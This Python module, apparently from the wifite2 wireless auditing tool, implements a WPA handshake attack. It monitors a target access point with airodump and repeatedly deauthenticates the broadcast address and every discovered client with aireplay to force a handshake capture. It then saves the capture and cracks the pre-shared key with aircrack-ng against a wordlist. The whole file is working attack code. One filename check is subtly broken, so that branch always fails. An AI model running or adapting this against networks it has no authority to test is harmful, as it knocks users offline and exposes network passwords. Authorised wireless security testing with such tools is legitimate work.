#!/usr/bin/env python
# -*- coding: utf-8 -*-


import time
import os
import re
from shutil import copy
from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA


class AttackWPA(Attack):
    def __init__(self, target):
        super().__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        """Initiates full WPA handshake capture attack."""

        # Skip if target is not WPS
        if Configuration.wps_only and self.target.wps is False:
            Color.pl(
                f'\r{{!}} {{O}}Skipping WPA-Handshake attack on {{R}}{self.target.essid}{{O}} because {{R}}--wps-only{{O}} is set{{W}}')
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            return self._extracted_from_run_30(
                '{+} Not cracking handshake because {C}skip-crack{W} was used{W}'
            )
        # Check wordlist
        if Configuration.wordlist is None:
            return self._extracted_from_run_30(
                '{!} {O}Not cracking handshake because wordlist ({R}--dict{O}) is not set'
            )
        if not os.path.exists(Configuration.wordlist):
            Color.pl(
                f'{{!}} {{O}}Not cracking handshake because wordlist {{R}}{Configuration.wordlist}{{O}} was not found')
            self.success = False
            return False

        Color.pl(f'\n{{+}} {{C}}Cracking WPA Handshake:{{W}} Running {{C}}aircrack-ng{{W}} with '
                 '{{C}}{}{{W}} wordlist'.format(os.path.split(Configuration.wordlist)[-1]))

        # Crack it
        key = Aircrack.crack_handshake(handshake, show_command=False)
        if key is None:
            Color.pl(
                f'{{!}} {{R}}Failed to crack handshake: {{O}}{Configuration.wordlist.split(os.sep)[-1]}{{R}} did not contain password{{W}}')
            self.success = False
        else:
            Color.pl(f'{{+}} {{G}}Cracked WPA Handshake{{W}} PSK: {{G}}{key}{{W}}\n')
            self.crack_result = CrackResultWPA(
                handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        return self.success

    # TODO Rename this here and in `run`
    def _extracted_from_run_30(self, arg0):
        Color.pl(arg0)
        self.success = False
        return False

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack(
                'WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if not Configuration.ignore_old_handshakes:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture',
                                  f'found {{G}}existing handshake{{W}} for '
                                  f'{{C}}{handshake.essid}{{W}}')
                    Color.pl(f'\n{{+}} Using handshake from {{C}}{handshake.capfile}{{W}}')
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              f'Listening. (clients:{{G}}{len(self.clients):d}{{W}}, deauth:{{O}}{deauth_timer}{{W}}, timeout:{{R}}{timeout_timer}{{W}})')

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  airodump_target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W}')
                    Color.pl('')
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'Handshake capture',
                                      f'Discovered new client: {{G}}{client.station}{{W}}')
                        Color.pl('')
                        self.clients.append(client.station)

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())

        if handshake is None:
            # No handshake, attack failed.
            Color.pl(
                f'\n{{!}} {{O}}WPA handshake capture {{R}}FAILED:{{O}} Timed out after'
                f'{Configuration.wpa_attack_timeout:d} seconds')
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)

        return handshake

    @staticmethod
    def load_handshake(bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(fr'handshake_{essid_safe}_{bssid_safe}_{date}\.cap')

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    @staticmethod
    def save_handshake(handshake):
        """
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        """
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and isinstance(type, handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = f'handshake_{essid_safe}_{bssid_safe}_{date}.cap'
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p(
                f'{{+}} {{C}}stripping{{W}} non-handshake packets, saving to {{G}}{cap_filename}{{W}}...')
            handshake.strip(outfile=cap_filename)
        else:
            Color.p(f'{{+}} saving copy of {{C}}handshake{{W}} to {{C}}{cap_filename}{{W}} ')
            copy(handshake.capfile, cap_filename)
        Color.pl('{G}saved{W}')
        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename

    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """
        if Configuration.no_deauth:
            return

        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'Handshake capture',
                          f'Deauthing {{O}}{target_name}{{W}}')
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target

    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2' \
             ',        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
    Configuration.exit_gracefully(0)
